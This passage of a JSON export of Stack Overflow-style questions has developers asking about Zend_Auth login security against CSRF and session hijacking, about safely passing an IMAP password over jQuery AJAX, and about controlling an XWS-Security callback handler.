way to do this?</p>\n\n<p>Thanks in advance.</p>\n"},{"tags":["security","zend-auth"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12593259,"title":"Does basic Zend Authentication leave any gaping security holes like CSRF?","body":"<p>I have a security related concern that may be tied to a Zend::Auth example in the David Powers book PHP training from the source.  I am using Zend Community edition 1.11.11 as an includes library and not as the MVC framework.  While this is installed an working on my site:</p>\n\n<pre><code>&lt;?php\n\n$failed = FALSE;\n\nif ($_POST) {\n\nif (empty($_POST['username']) || empty($_POST['password'])) {\n\n$failed = TRUE;\n\n} else {\n\nrequire_once('library.php');\n\n// check the user's credentials\n\ntry {\n\n  $auth = Zend_Auth::getInstance();\n\n  $adapter = new Zend_Auth_Adapter_DbTable($dbRead, 'user', 'login', 'user_pass', 'sha1(?)');\n\n  $adapter-&gt;setIdentity($_POST['username']);\n\n  $adapter-&gt;setCredential($_POST['password']);\n\n  $result = $auth-&gt;authenticate($adapter);\n\n  if ($result-&gt;isValid()) {\n\n    $storage = $auth-&gt;getStorage();\n\n    $storage-&gt;write($adapter-&gt;getResultRowObject(array(\n\n      'ID', 'login',  'user_first', 'user_last', 'user_role')));\n\n    header('Location: /member/index.php');\n\n    exit;\n\n  } else {\n\n    $failed = TRUE;\n\n  }\n\n} catch (Exception $e) {\n\n  echo $e-&gt;getMessage();\n\n}\n\n}\n\n}\n\nif (isset($_GET['logout'])) {\n\n require_once('library.php');\n\ntry {\n\n $auth = Zend_Auth::getInstance();\n\n$auth-&gt;clearIdentity();\n\n} catch (Exception $e) {\n\necho $e-&gt;getMessage();\n\n}\n</code></pre>\n\n<p>}</p>\n\n<p>Apparently, there is very limited protection against Cross Site Request Forgery, where the resulting SessionID could be easily hijacked?   I have an observation from a client that this authentication is not up to snuff. I'm trying:  </p>\n\n<pre><code>    $namespace = new Zend_Session_Namespace('Zend_Auth');\n    $namespace-&gt;setExpirationSeconds(3600);\n</code></pre>\n\n<p>(but this is not particularly desirable for the site usage)</p>\n\n<p>To boil it down: </p>\n\n<ol>\n<li><p>Is there a Zend configuration file or some know best practices that might increase the security/authentication beyond this basic example?  Ie How to secure the session against a changing user IP, and invoking some other session handling techniques to reduce XSS or CRSF?  </p></li>\n<li><p>Will \"salting\" passwords won't help with this?</p></li>\n</ol>\n\n<p>Any help for this newbie to Zend is appreciated.  </p>\n\n<p>EDIT:  I see this <a href=\"http://stackoverflow.com/questions/2453341/how-does-hash-element-make-a-secure-login-on-zend-framework\">question</a> answers the CRSF part by suggesting use of the Zend Form Hash Element.  Is this the best practice?</p>\n"},{"tags":["php","javascript","jquery","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":213,"score":0,"question_id":4927309,"title":"How to call a javascript file during PHP file execution. ","body":"<p>I'm dealing with passwords so security is critical.  </p>\n\n<p>Here's the flow...</p>\n\n<p>I want to periodically update a user's screen with data I am fetching.  </p>\n\n<p>I would use a jquery function and call a smaller php file upon success, but I don't want to pass the user's password in a POST function.  </p>\n\n<p>I am assuming that if I call a jquery function from within the PHP function periodically, that would eliminate the issue of passing a password using the post function to php.  </p>\n\n<p>Reason I'm passing a password is that I'm using IMAP and have to use a user's password in order to retrieve emails.  </p>\n\n<p>Current flow (non secure)\n1.)  Pass username and password using javascript into PHP function using jquery AJAX and POST variable.  My assumption is that this is not secure.  </p>\n\n<p>What's the secure solution?  </p>\n"},{"tags":["java","web-services","security","jax-ws"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":14,"score":0,"question_id":12602848,"title":"XWS-Security Framework and SignatureFilter","body":"<p>I have been using XWS-Security Framework, and having one question due to issue which occurs.</p>\n\n<p>So, I have a dynamic web project, and implementation of  javax.security.auth.callback.CallbackHandler interface.</p>\n\n<p>How can I prevent loading of the handler programmatically?</p>\n\n<p>Thank you in advance!</p>\n\n<p>Best regards,\nJurica Krizanic</p>\n"}]}
